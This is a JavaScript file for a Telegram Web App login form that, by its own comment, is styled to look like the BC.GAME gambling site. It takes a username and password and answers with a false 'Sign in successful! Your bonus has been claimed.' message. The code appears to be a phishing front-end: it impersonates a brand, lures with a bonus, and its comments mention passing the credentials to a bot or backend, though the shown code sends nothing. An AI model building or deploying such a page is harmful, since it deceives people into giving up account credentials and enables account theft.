// Initialize Telegram Web App
const tg = window.Telegram.WebApp;
tg.expand(); // Expand to full height

// Tab switching logic
const tabs = document.querySelectorAll('.tab');
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        
        // Update placeholder based on tab
        const usernameInput = document.getElementById('username');
        if (tab.dataset.tab === 'otp') {
            usernameInput.placeholder = 'Email / Phone Number';
        } else {
            usernameInput.placeholder = 'Email / Phone Number / Username';
        }
    });
});

// Password visibility toggle
const togglePassword = document.querySelector('.toggle-password');
const passwordInput = document.getElementById('password');

togglePassword.addEventListener('click', () => {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    
    // Change icon if needed (can be added later)
});

// Close button
document.getElementById('close-btn').addEventListener('click', () => {
    tg.close();
});

// Form submission
document.getElementById('login-form').addEventListener('submit', (e) => {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = passwordInput.value;

    // Show a loading state on the button
    const submitBtn = e.target.querySelector('.submit-btn');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Signing in...';
    submitBtn.disabled = true;

    // Send data back to the bot
    // In a real scenario, you'd send this to your backend
    // But since this is a Web App, we can use sendData for simple interactions
    // Or just show a success message
    
    setTimeout(() => {
        tg.showAlert('Sign in successful! Your bonus has been claimed.');
        tg.close();
    }, 1500);
});

// Handle theme changes from Telegram
tg.onEvent('themeChanged', () => {
    // You could adjust colors here if needed to match TG theme
    // but the user wants it to look like BC.GAME (dark)
});
